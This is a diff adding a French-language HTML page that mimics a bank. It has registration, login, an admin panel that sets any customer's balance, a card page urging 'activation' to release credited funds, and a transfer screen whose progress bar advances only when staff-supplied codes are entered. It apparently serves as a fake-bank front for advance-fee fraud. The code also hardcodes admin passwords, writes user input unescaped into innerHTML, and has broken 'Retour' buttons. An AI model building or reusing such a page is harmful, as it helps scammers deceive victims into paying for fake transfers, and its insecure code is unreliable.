@@ -1,0 +1,336 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Application Bancaire</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f4f4f9;
+        }
+        header {
+            background-color: #4CAF50;
+            color: white;
+            padding: 1rem;
+            text-align: center;
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+        }
+        nav {
+            display: flex;
+            justify-content: space-around;
+            background-color: #333;
+            padding: 0.5rem;
+        }
+        nav a {
+            color: white;
+            text-decoration: none;
+            padding: 0.5rem 1rem;
+        }
+        nav a:hover {
+            background-color: #575757;
+        }
+        .container {
+            padding: 1rem;
+        }
+        .card {
+            background: white;
+            margin: 1rem auto;
+            padding: 1rem;
+            border-radius: 8px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+            max-width: 600px;
+        }
+        .btn {
+            display: block;
+            width: 100%;
+            text-align: center;
+            padding: 0.5rem;
+            margin: 1rem 0;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        .btn:hover {
+            background-color: #45a049;
+        }
+        input {
+            width: 100%;
+            padding: 0.5rem;
+            margin: 0.5rem 0;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 1rem 0;
+        }
+        table th, table td {
+            border: 1px solid #ddd;
+            padding: 8px;
+            text-align: left;
+        }
+        table th {
+            background-color: #f2f2f2;
+        }
+        .progress-bar {
+            width: 100%;
+            background-color: #ddd;
+        }
+        .progress {
+            height: 30px;
+            background-color: #4CAF50;
+            width: 0;
+        }
+        .hide {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Application Bancaire</h1>
+    </header>
+    <nav>
+        <a href="#" onclick="showPage('home')">Accueil</a>
+        <a href="#" onclick="showPage('register')">S'inscrire</a>
+        <a href="#" onclick="showPage('login')">Se connecter</a>
+    </nav>
+    <div class="container" id="content"></div>
+
+    <script>
+        let users = [];
+        let adminAccounts = [
+            { username: "admin", password: "admin123" },
+            { username: "Martin34", password: "Machine34" }
+        ];
+
+        const pages = {
+            home: `<div class="card">
+                <h2>Bienvenue sur l'application bancaire</h2>
+                <p>Gérez vos comptes et transactions facilement.</p>
+            </div>`,
+            register: `<div class="card">
+                <h2>S'inscrire</h2>
+                <form onsubmit="registerUser(event)">
+                    <input type="text" id="nom" placeholder="Nom" required>
+                    <input type="text" id="prenom" placeholder="Prénom" required>
+                    <input type="email" id="email" placeholder="Email" required>
+                    <input type="text" id="adresse" placeholder="Adresse" required>
+                    <input type="text" id="numero" placeholder="Numéro de téléphone" required>
+                    <input type="text" id="pays" placeholder="Pays" required>
+                    <input type="text" id="username" placeholder="Nom d'utilisateur" required>
+                    <input type="password" id="password" placeholder="Mot de passe" required>
+                    <button type="submit" class="btn">Créer un compte</button>
+                </form>
+            </div>`,
+            login: `<div class="card">
+                <h2>Se connecter</h2>
+                <form onsubmit="loginUser(event)">
+                    <input type="text" id="loginUsername" placeholder="Nom d'utilisateur" required>
+                    <input type="password" id="loginPassword" placeholder="Mot de passe" required>
+                    <button type="submit" class="btn">Se connecter</button>
+                </form>
+            </div>`
+        };
+
+        function showPage(page) {
+            document.getElementById('content').innerHTML = pages[page];
+        }
+
+        showPage('home');
+
+        function registerUser(event) {
+            event.preventDefault();
+            const nom = document.getElementById('nom').value;
+            const prenom = document.getElementById('prenom').value;
+            const email = document.getElementById('email').value;
+            const adresse = document.getElementById('adresse').value;
+            const numero = document.getElementById('numero').value;
+            const pays = document.getElementById('pays').value;
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            users.push({ nom, prenom, email, adresse, numero, pays, username, password, solde: 1000 });
+            alert(`Compte créé avec succès pour ${prenom} ${nom}`);
+            showPage('login');
+        }
+
+        function loginUser(event) {
+            event.preventDefault();
+            const username = document.getElementById('loginUsername').value;
+            const password = document.getElementById('loginPassword').value;
+
+            const admin = adminAccounts.find(acc => acc.username === username && acc.password === password);
+            if (admin) {
+                alert('Bienvenue Administrateur!');
+                showAdminPage();
+                return;
+            }
+
+            const user = users.find(u => u.username === username && u.password === password);
+            if (user) {
+                alert('Connexion réussie!');
+                showUserDashboard(user);
+            } else {
+                alert('Nom d\'utilisateur ou mot de passe incorrect.');
+            }
+        }
+
+        function showAdminPage() {
+            document.getElementById('content').innerHTML = `<div class="card">
+                <h2>Tableau de bord Administrateur</h2>
+                <ul>
+                    ${users.map(user => `
+                        <li>
+                            ${user.prenom} ${user.nom} - Solde : ${user.solde.toFixed(2)}€
+                            <button onclick="modifyUser('${user.username}')">Modifier</button>
+                            <button onclick="deleteUser('${user.username}')">Supprimer</button>
+                        </li>
+                    `).join('')}
+                </ul>
+            </div>`;
+        }
+
+        function modifyUser(username) {
+            const user = users.find(u => u.username === username);
+            if (user) {
+                const newSolde = parseFloat(prompt(`Modifier le solde pour ${user.prenom} ${user.nom}:`, user.solde));
+                if (!isNaN(newSolde)) {
+                    user.solde = newSolde;
+                    alert(`Le solde de ${user.prenom} ${user.nom} a été mis à jour.`);
+                    showAdminPage();
+                } else {
+                    alert("Valeur invalide. Modification annulée.");
+                }
+            }
+        }
+
+        function deleteUser(username) {
+            const index = users.findIndex(u => u.username === username);
+            if (index !== -1) {
+                const confirmDelete = confirm("Voulez-vous vraiment supprimer ce compte?");
+                if (confirmDelete) {
+                    users.splice(index, 1);
+                    alert("Compte supprimé avec succès.");
+                    showAdminPage();
+                }
+            }
+        }
+
+        function showUserDashboard(user) {
+            document.getElementById('content').innerHTML = `<div class="card">
+                <h2>Bonjour, ${user.prenom} ${user.nom}</h2>
+                <p>Votre solde actuel est de ${user.solde.toFixed(2)}€</p>
+                <button class="btn" onclick="showBalance('${user.username}')">Voir Solde</button>
+                <button class="btn" onclick="showCard()">Ma Carte</button>
+                <button class="btn" onclick="showTransfer()">Virement</button>
+                <button class="btn" onclick="showAccountInfo('${user.username}')">Mon Compte</button>
+            </div>`;
+        }
+
+        function showBalance(username) {
+            const user = users.find(u => u.username === username);
+            if (user) {
+                document.getElementById('content').innerHTML = `<div class="card">
+                    <h2>Solde de ${user.prenom} ${user.nom}</h2>
+                    <p>Votre solde actuel est de ${user.solde.toFixed(2)}€</p>
+                    <button class="btn" onclick="showUserDashboard(user)">Retour</button>
+                </div>`;
+            }
+        }
+
+        function showCard() {
+            document.getElementById('content').innerHTML = `<div class="card">
+                <h2>Ma Carte</h2>
+                <p>Félicitations, votre carte de débit est disponible.</p>
+                <p>Avant toute usage, vous devez activer votre carte pour accélérer le transfert des fonds crédités sur votre compte.</p>
+                <p><strong>4987 **** **** 3991</strong></p>
+                <p><strong>VALIDE JUSQU'AU : 01/2028</strong></p>
+                <p><strong>CVV : 883</strong></p>
+                <button class="btn" onclick="showUserDashboard(user)">Retour</button>
+            </div>`;
+        }
+
+        function showTransfer() {
+            document.getElementById('content').innerHTML = `<div class="card">
+                <h2>Virement : Envoyer un virement sortant</h2>
+                <form onsubmit="processTransfer(event)">
+                    <input type="number" id="amount" placeholder="Montant" required>
+                    <input type="text" id="iban" placeholder="IBAN" required>
+                    <input type="text" id="bic" placeholder="Code Banque (BIC/SWIFT)" required>
+                    <input type="text" id="bankName" placeholder="Nom de la banque" required>
+                    <input type="text" id="beneficiaryName" placeholder="Nom du bénéficiaire" required>
+                    <input type="text" id="reason" placeholder="Motif du virement" required>
+                    <button type="submit" class="btn">Continuer</button>
+                </form>
+            </div>`;
+        }
+
+        function processTransfer(event) {
+            event.preventDefault();
+            // Display the progress bar for the transfer process
+            document.getElementById('content').innerHTML = `<div class="card">
+                <h2>Virement en cours, veuillez patienter...</h2>
+                <div class="progress-bar">
+                    <div class="progress" id="progress"></div>
+                </div>
+                <p>Veuillez entrer les codes demandés pour continuer :</p>
+                <input type="password" id="transferCode" placeholder="Entrez le code" required>
+                <button class="btn" onclick="verifyCode()">Continuer</button>
+            </div>`;
+        }
+
+        function verifyCode() {
+            const code = document.getElementById('transferCode').value;
+            const progress = document.getElementById('progress');
+            if (code === '000000') {
+                progress.style.width = '50%';
+                setTimeout(() => {
+                    document.getElementById('transferCode').value = '';
+                    progress.style.width = '80%';
+                    setTimeout(() => {
+                        document.getElementById('transferCode').value = '';
+                        progress.style.width = '100%';
+                        alert('Virement effectué avec succès!');
+                        showUserDashboard(user);
+                    }, 2000);
+                }, 2000);
+            } else if (code === '202020') {
+                progress.style.width = '80%';
+            } else if (code === '252525') {
+                progress.style.width = '100%';
+            } else {
+                alert('Code incorrect, veuillez réessayer');
+            }
+        }
+
+        function showAccountInfo(username) {
+            const user = users.find(u => u.username === username);
+            if (user) {
+                document.getElementById('content').innerHTML = `<div class="card">
+                    <h2>Informations Personnelles</h2>
+                    <p>Titulaire du compte : ${user.prenom} ${user.nom}</p>
+                    <p>Adresse e-mail : ${user.email}</p>
+                    <p>Numéro de téléphone : ${user.numero}</p>
+                    <p>Pays de résidence : ${user.pays}</p>
+                    <p>Adresse de résidence : ${user.adresse}</p>
+                    <h2>Compte et Virement</h2>
+                    <p>Solde du compte : ${user.solde.toFixed(2)}€</p>
+                    <p>Type de compte : Professionnel</p>
+                    <p>Statut du compte : Actif</p>
+                    <p>Virement supporté : Classique</p>
+                    <p>IBAN du bénéficiaire : Aucun IBAN enregistré</p>
+                    <button class="btn" onclick="showUserDashboard(user)">Retour</button>
+                </div>`;
+            }
+        }
+    </script>
+</body>
+</html>
